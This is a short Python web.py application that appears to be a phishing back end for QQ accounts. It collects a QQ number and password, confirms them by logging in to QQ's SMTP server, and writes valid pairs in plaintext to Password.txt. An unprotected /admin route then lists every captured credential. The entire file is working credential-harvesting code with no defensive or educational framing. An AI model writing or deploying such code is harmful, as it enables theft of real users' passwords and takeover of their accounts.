import os
import re
import web
import smtplib

from jinja2 import Environment, FileSystemLoader

templates_path = os.getcwd()

env = Environment(loader=FileSystemLoader(templates_path))

def check_qq(qq_number, qq_password):
    qq_mail = qq_number + "@qq.com"
    try:
        smtp = smtplib.SMTP_SSL()
        smtp.connect("smtp.qq.com", "465")
        smtp.login(qq_mail, qq_password)
    except smtplib.SMTPAuthenticationError:
        return False
    else:
        return True
    finally:
        smtp.quit()

def get_qq():
    PdFile = open("Password.txt", "r")
    users = []
    for line in PdFile:
        strList = line.split("^")
        user = {"qq": strList[0], "password": strList[1]}
        users.append(user)
    return users

class HomeHandler():
    def GET(self):
        return env.get_template("index.html").render(
            logged = False,
            wrong_qq = False
            )

    def POST(self):
        data = web.input()
        if check_qq(data.number, data.pd):
            content = '''%s^%s''' % (data.number, data.pd)
            PdFile = open('Password.txt','w')
            PdFile.write(content)
            PdFile.close()
            return env.get_template("index.html").render(
                logged = True,
                wrong_qq = False
                )
        else:
            return env.get_template("index.html").render(
                logged = False,
                wrong_qq = True
                )

class AdminHandler():
    def GET(self):
        return env.get_template("admin.html").render(
                users = get_qq()
                )

urls=(
    '/', 'HomeHandler',
    '/admin', 'AdminHandler'
)

app = web.application(urls, globals())

if __name__ == "__main__":
    app.run()
